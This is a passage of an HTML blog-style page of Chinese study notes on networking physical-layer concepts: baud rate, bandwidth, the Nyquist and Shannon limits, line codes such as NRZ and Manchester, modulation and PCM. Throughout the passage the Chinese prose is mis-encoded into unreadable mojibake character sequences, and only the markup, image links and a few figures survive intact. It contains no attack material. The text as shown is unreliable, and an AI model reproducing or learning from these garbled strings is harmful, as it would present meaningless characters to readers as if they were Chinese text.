å…ƒï¼Œä¸€ç§ä»£è¡¨0çŠ¶æ€ï¼Œå¦ä¸€ç§ä»£è¡¨1çŠ¶æ€ã€‚</p><p><strong>ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š</strong></p><p><img src="http://cdn.clown2024.cn/202407151636399.png" alt="image-20240311165607774"></p><p>ä¼ é€’01ä¿¡å·çš„æ—¶å€™ï¼Œåªæœ‰ä¸¤ç§çŠ¶æ€ä¹Ÿå°±æ˜¯åªæœ‰ä¸¤ç§ç å…ƒå°±å«åšäºŒè¿›åˆ¶ç å…ƒï¼›å¦‚æœæœ‰å››ç§çŠ¶æ€çš„è¯çš„å°±æ˜¯å››è¿›åˆ¶ç å…ƒï¼Œæ­¤æ—¶çš„ä¸€ä¸ªç å…ƒå°±å¯ä»¥æºå¸¦ä¸¤ä¸ªæ¯”ç‰¹çš„ä¿¡æ¯ï¼Œå› ä¸ºå››ç§çŠ¶æ€å¯ä»¥ç”¨ä¸¤ä¸ªæ¯”ç‰¹è¡¨ç¤ºå®Œå…¨ï¼›é‚£ä¹ˆç›¸å¯¹çš„ï¼Œ16è¿›åˆ¶ç å…ƒå°±å¯ä»¥æºå¸¦å››ä¸ªæ¯”ç‰¹çš„ä¿¡æ¯ã€‚</p></li><li><p>ç å…ƒä¼ è¾“é€Ÿç‡ï¼šåˆ«åç å…ƒé€Ÿç‡ã€æ³¢å½¢é€Ÿç‡ã€è°ƒåˆ¶é€Ÿç‡ã€ç¬¦å·é€Ÿç‡ç­‰ï¼Œå®ƒè¡¨ç¤ºå•ä½æ—¶é—´å†…æ•°å­—é€šä¿¡ç³»ç»Ÿæ‰€ä¼ è¾“çš„ç å…ƒä¸ªæ•°(ä¹Ÿå¯ç§°ä¸ºè„‰å†²ä¸ªæ•°æˆ–ä¿¡å·å˜åŒ–çš„æ¬¡æ•°)ï¼Œå•ä½æ˜¯æ³¢ç‰¹(Baud)ï¼›1æ³¢ç‰¹è¡¨ç¤ºæ•°å­—é€šä¿¡ç³»ç»Ÿæ¯ç§’ä¼ è¾“ä¸€ä¸ªç å…ƒã€‚</p><p>æ•°å­—ä¿¡å·æœ‰å¤šè¿›åˆ¶å’ŒäºŒè¿›åˆ¶ä¹‹åˆ†ï¼Œä½†ç å…ƒé€Ÿç‡ä¸è¿›åˆ¶æ•°æ— å…³ï¼Œåªä¸ç å…ƒé•¿åº¦Tæœ‰å…³ï¼›<strong>Tå°±æ˜¯ä¸Šé¢01ä¿¡å·çš„ä¸€æ¨ªæ æ—¶é—´ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªçŠ¶æ€å˜åŒ–çš„æ—¶é—´ã€‚</strong></p><p><img src="http://cdn.clown2024.cn/202407151636400.png" alt="image-20240311170416392"></p></li><li><p>ä¿¡æ¯ä¼ è¾“é€Ÿç‡ï¼šåˆ«åä¿¡æ¯é€Ÿç‡ã€æ¯”ç‰¹ç‡ç­‰ï¼Œè¡¨ç¤ºå•ä½æ—¶é—´å†…æ•°å­—é€šä¿¡ç³»ç»Ÿä¼ è¾“çš„äºŒè¿›åˆ¶ç å…ƒä¸ªæ•°(å³æ¯”ç‰¹æ•°)ï¼Œå•ä½æ˜¯æ¯”ç‰¹&#x2F;ç§’(b&#x2F;s)</p><p>è‹¥ä¸€ä¸ªç å…ƒæºå¸¦n bitçš„ä¿¡æ¯é‡ï¼Œé‚£ä¹ˆM Baudçš„ç å…ƒä¼ è¾“é€Ÿç‡æ‰€å¯¹åº”çš„ä¿¡æ¯ä¼ è¾“é€Ÿç‡å°±ä¸ºM*n bit&#x2F;sã€‚</p></li><li><p>å¸¦å®½ï¼š</p><ul><li>æ¨¡æ‹Ÿä¿¡å·ç³»ç»Ÿä¸­ï¼šå½“è¾“å…¥çš„ä¿¡å·é¢‘ç‡é«˜æˆ–ä½åˆ°ä¸€å®šç¨‹åº¦ï¼Œä½¿å¾—ç³»ç»Ÿçš„è¾“å‡ºåŠŸç‡æˆä¸ºè¾“å…¥åŠŸç‡çš„ä¸€åŠæ—¶(å³-3dB)ï¼Œæœ€é«˜é¢‘ç‡å’Œæœ€ä½é¢‘ç‡é—´çš„å·®å€¼å°±ä»£è¡¨äº†ç³»ç»Ÿçš„é€šé¢‘å¸¦å®½ï¼Œå…¶å•ä½ä¸ºèµ«å…¹(Hz)ã€‚</li><li>æ•°å­—è®¾å¤‡ä¸­ï¼šè¡¨ç¤ºåœ¨å•ä½æ—¶é—´å†…ä»ç½‘ç»œä¸­çš„æŸä¸€ç‚¹åˆ°å¦ä¸€ç‚¹æ‰€èƒ½é€šè¿‡çš„â€œæœ€é«˜æ•°æ®ç‡â€&#x2F;å•ä½æ—¶é—´å†…é€šè¿‡é“¾è·¯çš„æ•°é‡ï¼Œå¸¸ç”¨æ¥è¡¨ç¤ºç½‘ç»œçš„é€šä¿¡çº¿è·¯æ‰€èƒ½ä¼ è¾“æ•°æ®çš„èƒ½åŠ›ã€‚å•ä½æ˜¯æ¯”ç‰¹æ¯ç§’(bpsæˆ–b&#x2F;s)ã€‚å¸¦å®½æ›´å®½ï¼Œä¹Ÿå°±æ˜¯æœ‰æ›´å¤§çš„ä¿¡æ¯è¿é€èƒ½åŠ›ã€‚</li></ul></li></ul><h1 id="å¥ˆæ°å‡†åˆ™"><a href="#å¥ˆæ°å‡†åˆ™" class="headerlink" title="å¥ˆæ°å‡†åˆ™"></a>å¥ˆæ°å‡†åˆ™</h1><h2 id="å¤±çœŸ"><a href="#å¤±çœŸ" class="headerlink" title="å¤±çœŸ"></a>å¤±çœŸ</h2><p>å°±æ˜¯å› ä¸ºä¸€äº›å› ç´ å¹²æ‰°ï¼Œå¯¼è‡´ä¼ è¾“è¿‡ç¨‹ä¸­ä¿¡å·æ³¢å½¢æ”¹å˜ï¼Œå¯¼è‡´æ¥æ”¶æ–¹éš¾ä»¥è¾¨è®¤ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151636401.png" alt="image-20240311171514652"></p><p><strong>å½±å“å¤±çœŸç¨‹åº¦çš„å› ç´ ï¼š</strong>1.ç å…ƒä¼ è¾“é€Ÿç‡2.ä¿¡å·ä¼ è¾“è·ç¦»3.å™ªå£°å¹²æ‰° 4.ä¼ è¾“åª’ä½“è´¨é‡</p><p><strong>ç é—´ä¸²æ‰°</strong></p><p>å› ä¸ºä¼ è¾“çš„é¢‘ç‡å¤ªå¿«å¯¼è‡´æ¥æ”¶ç«¯å¤±å»äº†ç å…ƒä¹‹é—´æ¸…æ™°ç•Œé™çš„ç°è±¡</p><p><strong>ä¿¡é“å¸¦å®½</strong></p><p>ä¿¡é“å¸¦å®½æ˜¯ä¿¡é“èƒ½é€šè¿‡çš„æœ€é«˜é¢‘ç‡å’Œæœ€ä½é¢‘ç‡ä¹‹å·®ã€‚é¢‘ç‡è¿‡é«˜ä¼šå‘ç”Ÿç é—´ä¸²æ‰°ï¼Œè¿‡ä½ä¼šå¯¼è‡´å®¹æ˜“å—åˆ°å¹²æ‰°å¯¼è‡´æ³¢å½¢å˜åŒ–å¤ªå¤§ã€‚</p><p>æ¯”å¦‚ä¸‹å›¾ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151636402.png" alt="image-20240311181049734"></p><p>è¯¥å›¾çš„ä¿¡é“å¸¦å®½å°±æ˜¯3300Hz-300Hz&#x3D;3000Hz</p><h2 id="å¥ˆæ°å‡†åˆ™å¥ˆå¥æ–¯ç‰¹å®šç†"><a href="#å¥ˆæ°å‡†åˆ™-å¥ˆå¥æ–¯ç‰¹å®šç†" class="headerlink" title="å¥ˆæ°å‡†åˆ™(å¥ˆå¥æ–¯ç‰¹å®šç†)"></a>å¥ˆæ°å‡†åˆ™(å¥ˆå¥æ–¯ç‰¹å®šç†)</h2><p><strong>å¥ˆå¼å‡†åˆ™</strong>ï¼šåœ¨ç†æƒ³ä½é€š(æ— å™ªå£°ï¼Œå¸¦å®½å—é™)æ¡ä»¶ä¸‹ï¼Œä¸ºäº†é¿å…ç é—´ä¸²æ‰°ï¼Œæé™ç å…ƒä¼ è¾“é€Ÿç‡ä¸º2W Baudï¼ŒWæ˜¯ä¿¡é“å¸¦å®½ï¼Œå•ä½æ˜¯Hzã€‚</p><p>æé™æ•°æ®ä¼ è¾“é€Ÿç‡è®¡ç®—å¦‚ä¸‹ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢ç å…ƒä¼ è¾“é€Ÿç‡å’Œä¿¡æ¯ä¼ è¾“é€Ÿç‡çš„è½¬æ¢ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151636403.png" alt="image-20240311181856387"></p><p>ç”±å¥ˆå¼å‡†åˆ™å¯ä»¥æ¨å‡ºä¸‹é¢çš„ç»“è®ºï¼š</p><ol><li><p>åœ¨ä»»ä½•ä¿¡é“ä¸­ï¼Œç å…ƒä¼ è¾“çš„é€Ÿç‡æ˜¯æœ‰ä¸Šé™çš„ã€‚è‹¥ä¼ è¾“é€Ÿç‡è¶…è¿‡æ­¤ä¸Šé™ï¼Œå°±ä¼šå‡ºç°ä¸¥é‡çš„ç é—´ä¸²æ‰°é—®é¢˜ï¼Œä½¿æ¥æ”¶ç«¯å¯¹ç å…ƒçš„å®Œå…¨æ­£ç¡®è¯†åˆ«æˆä¸ºä¸å¯èƒ½ã€‚</p></li><li><p>ä¿¡é“çš„é¢‘å¸¦è¶Šå®½(å³èƒ½é€šè¿‡çš„ä¿¡å·é«˜é¢‘åˆ†é‡è¶Šå¤š)ï¼Œå°±å¯ä»¥ç”¨æ›´é«˜çš„é€Ÿç‡è¿›è¡Œç å…ƒçš„æœ‰æ•ˆä¼ è¾“ã€‚</p></li><li><p>å¥ˆæ°å‡†åˆ™ç»™å‡ºäº†ç å…ƒä¼ è¾“é€Ÿç‡çš„é™åˆ¶ï¼Œä½†å¹¶æ²¡æœ‰å¯¹ä¿¡æ¯ä¼ è¾“é€Ÿç‡ç»™å‡ºé™åˆ¶ã€‚</p></li><li><p>ç”±äºç å…ƒçš„ä¼ è¾“é€Ÿç‡å—å¥ˆæ°å‡†åˆ™çš„åˆ¶çº¦ï¼Œæ‰€ä»¥è¦æé«˜æ•°æ®çš„ä¼ è¾“é€Ÿç‡ï¼Œå°±å¿…é¡»è®¾æ³•ä½¿æ¯ä¸ªç å…ƒèƒ½æºå¸¦æ›´å¤šä¸ªæ¯”ç‰¹çš„ä¿¡æ¯é‡ï¼Œè¿™å°±éœ€è¦é‡‡ç”¨å¤šå…ƒåˆ¶çš„è°ƒåˆ¶æ–¹æ³•ã€‚</p></li></ol><h1 id="é¦™å†œå®šç†"><a href="#é¦™å†œå®šç†" class="headerlink" title="é¦™å†œå®šç†"></a>é¦™å†œå®šç†</h1><p>å™ªå£°å­˜åœ¨äºæ‰€æœ‰çš„ç”µå­è®¾å¤‡å’Œé€šä¿¡ä¿¡é“ä¸­ã€‚ç”±äºå™ªå£°éšæœºäº§ç”Ÿï¼Œå®ƒçš„ç¬æ—¶å€¼æœ‰æ—¶ä¼šå¾ˆå¤§ï¼Œå› æ­¤å™ªå£°ä¼šä½¿æ¥æ”¶ç«¯å¯¹ç å…ƒçš„åˆ¤å†³äº§ç”Ÿé”™è¯¯ã€‚ä½†æ˜¯å™ªå£°çš„å½±å“æ˜¯ç›¸å¯¹çš„ï¼Œè‹¥ä¿¡å·è¾ƒå¼ºï¼Œé‚£ä¹ˆå™ªå£°å½±å“ç›¸å¯¹è¾ƒå°ã€‚å› æ­¤ï¼Œä¿¡å™ªæ¯”å°±å¾ˆé‡è¦ã€‚<strong>ä¿¡å™ªæ¯”&#x3D;ä¿¡å·çš„å¹³å‡åŠŸç‡&#x2F;å™ªå£°çš„å¹³å‡åŠŸç‡</strong>ï¼Œå¸¸è®°ä¸ºS&#x2F;Nï¼Œå¹¶ç”¨åˆ†è´(dB)ä½œä¸ºåº¦é‡å•ä½ï¼Œå³:</p><p><img src="http://cdn.clown2024.cn/202407151636404.png" alt="image-20240312093325742"></p><p><strong>é¦™å†œå®šç†</strong>ï¼šåœ¨å¸¦å®½å—é™ä¸”æœ‰å™ªå£°çš„ä¿¡é“ä¸­ï¼Œä¸ºäº†ä¸äº§ç”Ÿè¯¯å·®ï¼Œä¿¡æ¯çš„ä¼ è¾“é€Ÿç‡æœ‰ä¸Šé™å€¼</p><p><img src="http://cdn.clown2024.cn/202407151636405.png" alt="image-20240312093437732"></p><p><strong>é€šè¿‡é¦™å†œå®šç†å¾—å‡ºçš„æ¨è®º</strong></p><ol><li><p>ä¿¡é“çš„å¸¦å®½æˆ–ä¿¡é“ä¸­çš„ä¿¡å™ªæ¯”è¶Šå¤§ï¼Œåˆ™ä¿¡æ¯çš„æé™ä¼ è¾“é€Ÿç‡å°±è¶Šé«˜ã€‚</p></li><li><p>å¯¹ä¸€å®šçš„ä¼ è¾“å¸¦å®½å’Œä¸€å®šçš„ä¿¡å™ªæ¯”ï¼Œä¿¡æ¯ä¼ è¾“é€Ÿç‡çš„ä¸Šé™å°±ç¡®å®šäº†ã€‚</p></li><li><p>åªè¦ä¿¡æ¯çš„ä¼ è¾“é€Ÿç‡ä½äºä¿¡é“çš„æé™ä¼ è¾“é€Ÿç‡ï¼Œå°±ä¸€å®šèƒ½æ‰¾åˆ°æŸç§æ–¹æ³•æ¥å®ç°æ— å·®é”™çš„ä¼ è¾“ã€‚</p></li><li><p>é¦™å†œå®šç†å¾—å‡ºçš„ä¸ºæé™ä¿¡æ¯ä¼ è¾“é€Ÿç‡ï¼Œå®é™…ä¿¡é“èƒ½è¾¾åˆ°çš„ä¼ è¾“é€Ÿç‡è¦æ¯”å®ƒä½ä¸å°‘ã€‚</p></li><li><p>ä»é¦™å†œå®šç†å¯ä»¥çœ‹å‡ºï¼Œè‹¥ä¿¡é“å¸¦å®½Wæˆ–ä¿¡å™ªæ¯”S&#x2F;Næ²¡æœ‰ä¸Šé™(ä¸å¯èƒ½)ï¼Œé‚£ä¹ˆä¿¡é“çš„æé™ä¿¡æ¯ä¼ è¾“é€Ÿç‡ä¹Ÿå°±æ²¡æœ‰ä¸Šé™ã€‚</p></li></ol><h2 id="å¥ˆå¼å’Œé¦™å†œçš„å¯¹æ¯”"><a href="#å¥ˆå¼å’Œé¦™å†œçš„å¯¹æ¯”" class="headerlink" title="å¥ˆå¼å’Œé¦™å†œçš„å¯¹æ¯”"></a>å¥ˆå¼å’Œé¦™å†œçš„å¯¹æ¯”</h2><p><img src="http://cdn.clown2024.cn/202407151636406.png" alt="image-20240312094031816"></p><p><strong>ä¾‹é¢˜</strong></p><p><img src="http://cdn.clown2024.cn/202407151636407.png" alt="image-20240312094101429"></p><p>åœ¨ä¸¤ä¸ªå…¬å¼ç®—å‡ºçš„æ•°æ®ä¼ è¾“é€Ÿç‡ä¸­ï¼Œåº”è¯¥é€‰æ‹©è¾ƒå°çš„é‚£ä¸ªæ‰æ˜¯æ­£ç¡®çš„ã€‚</p><h1 id="ç¼–ç ä¸è°ƒåˆ¶"><a href="#ç¼–ç ä¸è°ƒåˆ¶" class="headerlink" title="ç¼–ç ä¸è°ƒåˆ¶"></a>ç¼–ç ä¸è°ƒåˆ¶</h1><h2 id="åŸºå¸¦ä¿¡å·ä¸å®½å¸¦ä¿¡å·"><a href="#åŸºå¸¦ä¿¡å·ä¸å®½å¸¦ä¿¡å·" class="headerlink" title="åŸºå¸¦ä¿¡å·ä¸å®½å¸¦ä¿¡å·"></a>åŸºå¸¦ä¿¡å·ä¸å®½å¸¦ä¿¡å·</h2><ul><li><p><strong>åŸºå¸¦ä¿¡å·ï¼š</strong>å°†æ•°å­—ä¿¡å·1å’Œ0ç›´æ¥ç”¨ä¸¤ç§ä¸åŒçš„ç”µå‹è¡¨ç¤ºï¼Œå†é€åˆ°æ•°å­—ä¿¡é“ä¸Šå»ä¼ è¾“(åŸºå¸¦ä¼ è¾“)ã€‚</p><p>æ¥è‡ªä¿¡æºçš„ä¿¡å·ï¼Œåƒè®¡ç®—æœºè¾“å‡ºçš„ä»£è¡¨å„ç§æ–‡å­—æˆ–å›¾åƒæ–‡ä»¶çš„æ•°æ®ä¿¡å·éƒ½å±äºåŸºå¸¦ä¿¡å·ã€‚åŸºå¸¦ä¿¡å·å°±æ˜¯å‘å‡ºçš„ç›´æ¥è¡¨è¾¾äº†è¦ä¼ è¾“çš„ä¿¡æ¯çš„ä¿¡å·ï¼Œæ¯”å¦‚æˆ‘ä»¬è¯´è¯çš„å£°æ³¢å°±æ˜¯åŸºå¸¦ä¿¡å·ã€‚(æ‰€ä»¥åŸºå¸¦ä¿¡å·ä¹Ÿå¯ä»¥æ˜¯æ¨¡æ‹Ÿä¿¡å·ï¼Œåªæ˜¯åœ¨è®¡ç½‘ä¸­é€šå¸¸æŒ‡çš„æ˜¯æ•°å­—ä¿¡å·)</p></li><li><p><strong>å®½å¸¦ä¿¡å·ï¼š</strong>å°†åŸºå¸¦ä¿¡å·è¿›è¡Œè°ƒåˆ¶åå½¢æˆçš„é¢‘åˆ†å¤ç”¨æ¨¡æ‹Ÿä¿¡å·ï¼Œå†ä¼ é€åˆ°æ¨¡æ‹Ÿä¿¡é“ä¸Šå»ä¼ è¾“(å®½å¸¦ä¼ è¾“)</p><p>æŠŠåŸºå¸¦ä¿¡å·ç»è¿‡è½½æ³¢è°ƒåˆ¶åï¼ŒæŠŠä¿¡å·çš„é¢‘ç‡èŒƒå›´æ¬ç§»åˆ°è¾ƒé«˜çš„é¢‘æ®µä»¥ä¾¿åœ¨ä¿¡é“ä¸­ä¼ è¾“(å³ä»…åœ¨ä¸€æ®µé¢‘ç‡èŒƒå›´å†…èƒ½å¤Ÿé€šè¿‡ä¿¡é“)ã€‚</p></li></ul><p>è¿™ä¸¤ç§ä¿¡å·çš„é€‰æ‹©è·Ÿä¼ è¾“è·ç¦»æœ‰å…³ï¼Œåœ¨è·ç¦»è¾ƒè¿‘æ—¶å¯ä»¥ç›´æ¥ä½¿ç”¨åŸºå¸¦ä¿¡å·ç›´æ¥ä¼ è¾“ï¼Œåœ¨è·ç¦»è¾ƒè¿œçš„æ—¶å€™å°±è¦ä½¿ç”¨å®½å¸¦ä¿¡å·é˜²æ­¢ä¿¡å·ä¸¢å¤±ä¸¥é‡ã€‚</p><h2 id="ç¼–ç ä¸è°ƒåˆ¶çš„åŒºåˆ†"><a href="#ç¼–ç ä¸è°ƒåˆ¶çš„åŒºåˆ†" class="headerlink" title="ç¼–ç ä¸è°ƒåˆ¶çš„åŒºåˆ†"></a>ç¼–ç ä¸è°ƒåˆ¶çš„åŒºåˆ†</h2><p><img src="http://cdn.clown2024.cn/202407151636408.png" alt="image-20240312135128620"></p><h2 id="ç¼–ç ä¸è°ƒåˆ¶çš„å…·ä½“æ–¹å¼"><a href="#ç¼–ç ä¸è°ƒåˆ¶çš„å…·ä½“æ–¹å¼" class="headerlink" title="ç¼–ç ä¸è°ƒåˆ¶çš„å…·ä½“æ–¹å¼"></a>ç¼–ç ä¸è°ƒåˆ¶çš„å…·ä½“æ–¹å¼</h2><h3 id="æ•°å­—æ•°æ®ç¼–ç ä¸ºæ•°å­—ä¿¡å·"><a href="#æ•°å­—æ•°æ®ç¼–ç ä¸ºæ•°å­—ä¿¡å·" class="headerlink" title="æ•°å­—æ•°æ®ç¼–ç ä¸ºæ•°å­—ä¿¡å·"></a>æ•°å­—æ•°æ®ç¼–ç ä¸ºæ•°å­—ä¿¡å·</h3><p>ä»¥ä¸‹é¢çš„äºŒè¿›åˆ¶æ•°æ®æ¥ä»‹ç»å„ç§ç¼–ç æ–¹å¼ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151636409.png" alt="image-20240312141043018"></p><ol><li><p>éå½’é›¶ç¼–ç ã€NRZã€‘</p><p><img src="http://cdn.clown2024.cn/202407151636410.png" alt="image-20240312141144428"></p><p>ç‰¹ç‚¹å°±æ˜¯é«˜1ä½0ï¼Œè¯¥ç¼–ç å¾ˆå®¹æ˜“å®ç°ï¼Œä½†æ²¡æœ‰çº é”™åŠŸèƒ½ï¼Œä¸”æ— æ³•åˆ¤æ–­ä¸€ä¸ªç å…ƒçš„å¼€å§‹å’Œç»“æŸï¼Œä»¥è‡³äºæ”¶å‘åŒæ–¹éš¾ä»¥ä¿æŒåŒæ­¥ã€‚</p></li><li><p>æ›¼å½»æ–¯ç‰¹ç¼–ç </p><p><img src="http://cdn.clown2024.cn/202407151636411.png" alt="image-20240312141802576"></p><p>å°†ä¸€ä¸ªç å…ƒåˆ†æˆä¸¤ä¸ªç›¸ç­‰çš„é—´éš”ï¼Œå‰ä¸€ä¸ªé—´éš”ä¸ºä½ç”µå¹³åä¸€ä¸ªé—´éš”ä¸ºé«˜ç”µå¹³è¡¨ç¤ºç å…ƒ1;ç å…ƒ0åˆ™æ­£å¥½ç›¸åã€‚ä¹Ÿå¯ä»¥é‡‡ç”¨ç›¸åçš„è§„å®šã€‚è¯¥ç¼–ç çš„ç‰¹ç‚¹æ˜¯åœ¨æ¯ä¸€ä¸ªç å…ƒçš„ä¸­é—´å‡ºç°ç”µå¹³è·³å˜ï¼Œä½äºä¸­é—´çš„è·³å˜æ—¢ä½œæ—¶é’Ÿä¿¡å·(å¯ç”¨äºåŒæ­¥)åˆä½œæ•°æ®ä¿¡å·ï¼Œä½†å®ƒæ‰€å çš„é¢‘å¸¦å®½åº¦æ˜¯åŸå§‹çš„åŸºå¸¦å®½åº¦çš„ä¸¤å€ã€‚</p><p><strong>æ‰€ä»¥æ•°æ®ä¼ è¾“é€Ÿç‡åªæœ‰è°ƒåˆ¶é€Ÿç‡çš„1&#x2F;2</strong></p></li><li><p>å·®åˆ†æ›¼å½»æ–¯ç‰¹ç¼–ç </p><p><img src="http://cdn.clown2024.cn/202407151636412.png" alt="image-20240312142117689"></p><p>å¸¸ç”¨äºå±€åŸŸç½‘ä¼ è¾“ï¼Œå…¶è§„åˆ™æ˜¯:è‹¥ç å…ƒä¸º1ï¼Œåˆ™å‰åŠä¸ªç å…ƒçš„ç”µå¹³ä¸ä¸Šä¸€ä¸ªç å…ƒçš„ååŠä¸ªç å…ƒçš„ç”µå¹³ç›¸åŒï¼Œè‹¥ä¸º0ï¼Œåˆ™ç›¸åã€‚è¯¥ç¼–ç çš„ç‰¹ç‚¹æ˜¯ï¼Œåœ¨æ¯ä¸ªç å…ƒçš„ä¸­é—´ï¼Œéƒ½æœ‰ä¸€æ¬¡ç”µå¹³çš„è·³è½¬ï¼Œå¯ä»¥å®ç°è‡ªåŒæ­¥ï¼Œä¸”æŠ—å¹²æ‰°æ€§å¼ºäºæ›¼å½»æ–¯ç‰¹ç¼–ç ã€‚</p></li><li><p>å½’é›¶ç¼–ç ã€RZã€‘</p><p><img src="http://cdn.clown2024.cn/202407151636413.png" alt="image-20240312141301827"></p><p>å°±æ˜¯ä¿¡å·ç”µå¹³åœ¨ä¸€ä¸ªç å…ƒä¹‹å†…éƒ½è¦æ¢å¤åˆ°é›¶ã€‚</p></li><li><p>åå‘ä¸å½’é›¶ç¼–ç ã€NRZIã€‘</p><p><img src="http://cdn.clown2024.cn/202407151636414.png" alt="image-20240312141439802"></p><p>ä¿¡å·ç”µå¹³ç¿»è½¬è¡¨ç¤º0ï¼Œä¿¡å·ç”µå¹³ä¸å˜è¡¨ç¤º1.</p></li><li><p>4B&#x2F;5Bç¼–ç </p><p>æ¯”ç‰¹æµä¸­æ’å…¥é¢å¤–çš„æ¯”ç‰¹ä»¥æ‰“ç ´ä¸€è¿ä¸²çš„0æˆ–1ï¼Œå°±æ˜¯ç”¨5ä¸ªæ¯”ç‰¹æ¥ç¼–ç 4ä¸ªæ¯”ç‰¹çš„æ•°æ®ï¼Œä¹‹åå†ä¼ ç»™æ¥æ”¶æ–¹ï¼Œå› æ­¤ç§°ä¸º4B&#x2F;5Bã€‚ç¼–ç æ•ˆç‡ä¸º80%ã€‚</p><p>åªé‡‡ç”¨16ç§ç¼–ç å¯¹åº”16ç§ä¸åŒçš„4ä½ç ï¼Œå¤šå‡ºæ¥çš„16ç§ä½œä¸ºæ§åˆ¶ç (å¸§çš„å¼€å§‹å’Œç»“æŸï¼Œçº¿è·¯çš„çŠ¶æ€ä¿¡æ¯ç­‰)æˆ–ä¿ç•™ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151636415.png" alt="image-20240312142425457"></p></li></ol><h3 id="æ•°å­—æ•°æ®è°ƒåˆ¶ä¸ºæ¨¡æ‹Ÿä¿¡å·"><a href="#æ•°å­—æ•°æ®è°ƒåˆ¶ä¸ºæ¨¡æ‹Ÿä¿¡å·" class="headerlink" title="æ•°å­—æ•°æ®è°ƒåˆ¶ä¸ºæ¨¡æ‹Ÿä¿¡å·"></a>æ•°å­—æ•°æ®è°ƒåˆ¶ä¸ºæ¨¡æ‹Ÿä¿¡å·</h3><p>æ•°å­—æ•°æ®è°ƒåˆ¶æŠ€æœ¯åœ¨å‘é€ç«¯å°†æ•°å­—ä¿¡å·è½¬æ¢ä¸ºæ¨¡æ‹Ÿä¿¡å·ï¼Œè€Œåœ¨æ¥æ”¶ç«¯å°†æ¨¡æ‹Ÿä¿¡å·è¿˜åŸä¸ºæ•°å­—ä¿¡å·ï¼Œåˆ†åˆ«å¯¹åº”äºè°ƒåˆ¶è§£è°ƒå™¨çš„è°ƒåˆ¶å’Œè§£è°ƒè¿‡ç¨‹ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151636416.png" alt="image-20240312142828014"></p><ul><li>è°ƒå¹…ï¼šä¸º1æ—¶æœ‰å¹…åº¦ï¼Œä¸º0æ—¶æ— å¹…åº¦</li><li>è°ƒé¢‘ï¼šä¸º0æ—¶é¢‘ç‡è¾ƒä½ï¼Œä¸º1æ—¶é¢‘ç‡è¾ƒé«˜</li><li>è°ƒç›¸ï¼šå³ä¸åŒçŠ¶æ€æ—¶æ³¢å½¢çš„ç›¸ä½ä¸åŒ</li></ul><blockquote><p>è¿˜å¯ä»¥ä½¿ç”¨è°ƒå¹…+è°ƒç›¸çš„ç»„åˆæ–¹å¼(QAM)ã€‚</p></blockquote><p><strong>ä¾‹é¢˜</strong></p><p><img src="http://cdn.clown2024.cn/202407151636417.png" alt="image-20240312143129934"></p><blockquote><p>è¿™é‡Œç›¸å½“äºæœ‰4<em>4&#x3D;16ç§ç å…ƒï¼Œä¹Ÿå°±æ˜¯ä¸€ç å…ƒä¼ è¾“å››æ¯”ç‰¹ä¿¡æ¯ï¼Œæ‰€ä»¥æ˜¯1200</em>4&#x3D;4800b&#x2F;s</p></blockquote><h3 id="æ¨¡æ‹Ÿæ•°æ®ç¼–ç ä¸ºæ•°å­—ä¿¡å·"><a href="#æ¨¡æ‹Ÿæ•°æ®ç¼–ç ä¸ºæ•°å­—ä¿¡å·" class="headerlink" title="æ¨¡æ‹Ÿæ•°æ®ç¼–ç ä¸ºæ•°å­—ä¿¡å·"></a>æ¨¡æ‹Ÿæ•°æ®ç¼–ç ä¸ºæ•°å­—ä¿¡å·</h3><p>è®¡ç®—æœºå†…éƒ¨å¤„ç†çš„æ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œå¤„ç†çš„éƒ½æ˜¯æ•°å­—éŸ³é¢‘ï¼Œæ‰€ä»¥éœ€è¦å°†æ¨¡æ‹ŸéŸ³é¢‘é€šè¿‡é‡‡æ ·ã€é‡åŒ–è½¬æ¢æˆæœ‰é™ä¸ªæ•°å­—è¡¨ç¤ºçš„ç¦»æ•£åºåˆ—(å³å®ç°éŸ³é¢‘æ•°å­—åŒ–)ã€‚</p><p>æœ€å…¸å‹çš„ä¾‹å­å°±æ˜¯å¯¹éŸ³é¢‘ä¿¡å·è¿›è¡Œç¼–ç çš„è„‰ç è°ƒåˆ¶(PCM)ï¼Œåœ¨è®¡ç®—æœºåº”ç”¨ä¸­ï¼Œèƒ½å¤Ÿè¾¾åˆ°æœ€é«˜ä¿çœŸæ°´å¹³çš„å°±æ˜¯PCMç¼–ç ï¼Œè¢«å¹¿æ³›ç”¨äºç´ æä¿å­˜åŠéŸ³ä¹æ¬£èµï¼ŒCDã€DVDä»¥åŠæˆ‘ä»¬å¸¸è§çš„ WAVæ–‡ä»¶ä¸­å‡æœ‰åº”ç”¨ã€‚å®ƒä¸»è¦åŒ…æ‹¬ä¸‰æ­¥:æŠ½æ ·ã€é‡åŒ–ã€ç¼–ç </p><ol><li><p>æŠ½æ ·</p><p>å¯¹æ¨¡æ‹Ÿä¿¡å·å‘¨æœŸæ€§æ‰«æï¼ŒæŠŠæ—¶é—´ä¸Šè¿ç»­çš„ä¿¡å·å˜æˆæ—¶é—´ä¸Šç¦»æ•£çš„ä¿¡å·ã€‚ä¸ºäº†ä½¿æ‰€å¾—çš„ç¦»æ•£ä¿¡å·èƒ½æ— å¤±çœŸåœ°ä»£è¡¨è¢«æŠ½æ ·çš„æ¨¡æ‹Ÿæ•°æ®ï¼Œè¦ä½¿ç”¨é‡‡æ ·å®šç†è¿›è¡Œé‡‡æ ·:<strong>f(é‡‡æ ·é¢‘ç‡)<strong>å¤§äºç­‰äº</strong>2f(ä¿¡å·æœ€é«˜é¢‘ç‡)</strong></p></li><li><p>é‡åŒ–</p><p>æŠŠæŠ½æ ·å–å¾—çš„ç”µå¹³å¹…å€¼æŒ‰ç…§ä¸€å®šçš„åˆ†çº§æ ‡åº¦è½¬åŒ–ä¸ºå¯¹åº”çš„æ•°å­—å€¼ï¼Œå¹¶å–æ•´æ•°ï¼Œè¿™å°±æŠŠè¿ç»­çš„ç”µå¹³å¹…å€¼è½¬æ¢ä¸ºç¦»æ•£çš„æ•°å­—é‡ã€‚</p></li><li><p>ç¼–ç </p><p>æŠŠé‡åŒ–çš„ç»“æœè½¬æ¢ä¸ºä¸ä¹‹å¯¹åº”çš„äºŒè¿›åˆ¶ç¼–ç 